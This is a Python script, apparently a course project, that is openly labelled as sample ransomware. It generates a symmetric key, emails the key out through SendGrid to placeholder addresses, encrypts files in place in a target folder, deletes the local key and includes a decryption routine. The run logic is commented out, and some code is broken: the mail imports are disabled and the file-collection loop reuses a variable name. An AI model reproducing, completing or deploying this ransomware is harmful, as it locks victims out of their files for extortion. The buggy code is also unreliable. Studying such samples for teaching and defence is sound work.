import subprocess
import sys
import argparse
import getpass
import os
import pathlib
import smtplib
import platform
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from dotenv import load_dotenv
# from sendgrid import SendGridAPIClient
# from sendgrid.helpers.mail import Mail

required_packages = ["subprocess", "sys", "argparse", "getpass", "os", "pathlib", "smtplib", "platform", "cryptography", "email", "dotenv", "sendgrid"]

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def navigateToDir(directory):
    location = str(pathlib.Path.home()) + '/' + directory
    try:
        os.chdir(location)
        print(f"Succesfully navigated to: {location}")
        return location
    except Exception as e:
        print(f"Error occurred: {e}")
    
    return None
    

def getFiles(directory):
    files = []

    for root, sd, files in os.walk(directory):
        if "CS440" in sd:
            path = os.path.join(root, "CS440")
            for cs440root, cs440sd, cs440files in os.walk(path):
                for file in cs440files:
                    files.append(os.path.join(root, file))
            break
            
    return files


def generateKey():
    key = Fernet.generate_key()
    with open("symmetric_key.key", "wb") as keyfile:
        keyfile.write(key)
    sendEmail()

def sendEmail():
    keyfile = f"{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key"
    message = Mail(
        from_email='sender@example.com',  # Use a verified sender email
        to_emails='receiver@example.com',
        subject='Your Generated Symmetric Key',
        html_content=f'{open(keyfile).read()}'
    )
    
    try:
        sg = SendGridAPIClient('your_sendgrid_api_key')  # Replace with your SendGrid API key
        response = sg.send(message)
        print(f"Email sent! Status code: {response.status_code}")
    except Exception as e:
        print(f"Failed to send email via SendGrid. Error: {e}")

def encrypt(target):
    with open(f"{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key", "rb") as keyfile:
        key = keyfile.read()
    key = Fernet(key)
    
    if target:
        for doc in target:
            with open(doc, "rb") as file:
                original = file.read()
            cipher = key.encrypt(original) 

            with open(doc, "wb") as encrypted_file:
                encrypted_file.write(cipher)
        
        os.remove(f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key')
    else:
        print("Target empty.")


def decrypt(target, key):
    key = Fernet(key)

    for doc in target:
        with open(doc, "rb") as encrypted_file:
            cipher = encrypted_file.read()
        original = key.decrypt(cipher)
        with open(doc, "wb") as decrypted_file:
            decrypted_file.write(original)


for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        print(f"Package '{package}' not found. Installing...")
        # install(package)

parser = argparse.ArgumentParser(prog='Ransomware', description='This is a sample Ransomware project.')
parser.add_argument('-k', type=str, help="The location of the decryption key", required=False)
parser.add_argument('-d', type=str, help="The directory to encrypt/decrypt the files", default='Desktop/Test')
args = parser.parse_args()

# if args.k:
#     directory = navigateToDir(args.d)
#     target = getFiles(directory)
#     decrypt(target, args.k)
# else:
#     generateKey()
#     directory = navigateToDir(args.d)
#     target = getFiles(directory)
#     encrypt(target)